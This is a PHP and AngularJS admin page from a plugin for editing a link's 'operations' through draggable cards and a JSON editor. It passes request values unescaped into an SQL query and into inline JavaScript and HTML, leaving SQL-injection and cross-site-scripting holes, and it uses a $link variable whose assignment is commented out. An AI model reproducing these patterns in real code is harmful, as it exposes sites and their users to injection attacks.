<?php

//############# php vars ######################
//############# php vars ######################
if(!defined('UADMIN_AB_ROOT')){die("You not have permisions");}

$ui=$_GET['ui'];


// 

// $link=$_GET['jab_cog'];


$link_ops = $sql->query("select * ,count() as size from opt where link='$link' limit 1")->fetchArray();




if ($link_ops['opt'] == "") {
    $link_ops['opt'] = "[]";
}

//#########################################
//#########################################

?>
<link rel="stylesheet" href="<?php echo $k_plugin->url_ ?>css/link_cog.css">

<div class="container-fluid mt-2">
    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="<?php echo $k_plugin->ajax_url ?>">Token panel</a></li>
            <li class="breadcrumb-item"><a href="<?php echo $k_plugin->ajax_url; ?>&ui=<?php echo $ui; ?>">O-Panel</a></li>
            <li class="breadcrumb-item active" >Oparations settings for  <b><?php echo $link; ?></b></li>
        </ol>
    </nav>
</div>


    <div class="container my-3"  ng-app="op-config-app" ng-controller="opts-crtl" ng-cloak>
        <div class="alert alert-warning">
            If you do not know what is it better do not touch it. You can make errors on script which will lead to re-install u-panel
        </div>
        
        <hr>
        <div class="alert alert-info" ng-show="$root.test_op">
        	<button type="button" class="close" ng-click="$root.test_op=false"  ><span aria-hidden="true">&times;</span></button>
        	{{test_op}}
        </div>
       
                <!-- operation -->
                <div class="">
                    <div class="row" dnd-list="opts">
                        <div class="col-sm-4  "  ng-repeat="op in opts " op-dir  dnd-draggable="op"     dnd-effect-allowed="move" dnd-selected="models.selected = op" ng-class="{'selected': models.selected === op}"                 dnd-moved="opts.splice($index, 1)"   >
                            <div class="card mb-1 border border-warning">
                                <div class="card-header clearfix m-0">
                                    <h5 class="panel-title mb-0">
                                         {{op.title}}
<div class="btn-group pull-right btn-group-sm" >
  <button type="button" class="btn btn-outline-danger" ng-click="remove_op($index)"  ><span class="fa fa-trash-o"></span></button>
  <!-- <button type="button" class="btn btn-info" ng-click="clone_op($index)"  ><span class="fa fa-clone"></span></button> -->
  <button type="button" class="btn btn-outline-info" ng-click="edit_op($index);" ><span class="fa fa-pencil"></span></button>
</div>
                                    </h5>
                                </div>
                                <div class="card-body text-right">
                                    <div class="form-group" ng-if="op.cn !==undefined">
                                        <input type="text" class="form-control" name="cn" id="cn" ng-model="op.cn">
                                    </div>
                                    <div    class="inputs" ng-repeat="input in op.inputs track by $index">
                                        <div class="form-group">
                                            <label for="input">{{input}}</label>
                                            <input type="text" class="form-control" id="input" placeholder="{{input}}" name="input" ng-model="op[input]">
                                        </div>
                                    </div>
                                    <div class="">
                                        <button class="btn btn-danger btn-sm" ng-click="set_operations()">{{op.button}}</button>
                                    </div>
                                    <div class="">
                                        <small>{{op.desc}}</small>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- operation -->
                <hr>
                <div class="buttons text-right ">
                    <button class="btn btn-outline-info " ng-click="add_new()">Add new operation</button>
                    <button class="btn btn-outline-info " ng-click="show_advanced();"  >Advanced</button>
                    <button class="btn btn-outline-success "  ng-click="save_ops()" >Save</button>
                    <!-- <a class="btn btn-primary" href="<?php echo $k_plugin->ajax_url.'&ui='.$_GET['b']?>">
                        <?php echo __('Back to')?> O-panel</a> -->
                </div>
           
        <div opmodal class="modal fade " id="op_modal">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" >Operation settings</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <form id="form111" onsubmit="return false" method="post" ng-submit="save()" autocomplete="off">
                            <div class="row " id="" style="">
                                <div class="col-sm-6">
                                    <label for="title">Header title</label>
                                    <input type="text" class="form-control" placeholder="Header title" name="title" id="title" ng-model="op.title"> </div>
                                <div class="col-sm-6">
                                    <label for="button">Button text</label>
                                    <input type="text" class="form-control" placeholder="Button text" name="button" id="button" ng-model="op.button"> </div>
                                <div class="col-sm-6">
                                    <label for="desc">Description</label>
                                    <input type="text" class="form-control" placeholder="Description" name="desc" id="desc" ng-model="op.desc"> </div>
                                <div class="col-sm-6">
                                    <label for="sql_ms">Add notification</label>
                                    <input type="text" class="form-control" placeholder="Add notification" name="sql_ms" id="sql_ms" ng-model="op.sql_ms"> </div>
                                <div class="col-sm-6">
                                    <label for="success_mes">Exec notification</label>
                                    <input type="text" class="form-control" placeholder="Exec notification" name="success_mes" id="success_mes" ng-model="op.success_mes"> </div>
                                <div class="col-sm-6">
                                    <label for="id">ID</label>
                                    <input type="text" class="form-control" placeholder="ID" name="id" id="id" ng-model="op.id"> </div>
                                <div class="col-sm-6">
                                    <label for="init_fn">Init fn.</label>
                                    <input type="text" class="form-control" placeholder="Init fn." name="init_fn" id="init_fn" ng-model="op.init_fn"> </div>
                                <div class="col-sm-6">
                                    <label for="inputs">Inputs( <small>Comma separated</small> )</label>
                                    <input type="text" class="form-control" ng-list placeholder="Inputs" name="inputs" id="inputs" ng-model="op.inputs"> </div>
                                <!-- <div class="col-sm-6"> <label for="id__">label__</label> <input type="text" class="form-control" placeholder="label__" name="id__" id="id__" ng-model="op.id__"> </div> -->
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <a href="javascript:void(0)" class="btn btn-outline-secondary float-left" data-dismiss="modal">
                            Cancel
                        </a>
                        <button type="submit" class="btn btn-outline-info" form="form111">{{button_name}}</button>
                    </div>
                </div>
            </div>
        </div>


        <div  class="modal fade bd-example-modal-sm" id="advanced_modal" >
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4 class="modal-title" id="myModalLabel">Operations JSON</h4>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <form id="form-advanced" onsubmit="return false" method="post" ng-submit="save_advanced()" autocomplete="off">
                            <div class="form-group">

                                <textarea name="advanced" id="advanced" cols="30" rows="10" class="form-control" ng-model="advanced"></textarea>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <a href="javascript:void(0)" class="btn btn-outline-secondary" data-dismiss="modal">
                            Cancel
                        </a>
                        <button type="submit" class="btn btn-outline-info" form="form-advanced">Ok</button>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <script type="text/javascript" src="bower_components/angular-drag-and-drop-lists/angular-drag-and-drop-lists.min.js"></script>

    <script type="text/javascript" src="<?php echo $k_plugin->url_?>js1/opconfigjs/ng.js"></script>
    <script type="text/javascript">
    var ui_ = <?php echo isset($_GET['ui'])?$_GET['ui']:"false";?>; //user to get back
    var opts = <?php echo ($link_ops['opt']) ?>;
    var link=  '<?php echo $link; ?>';


    
  
    </script>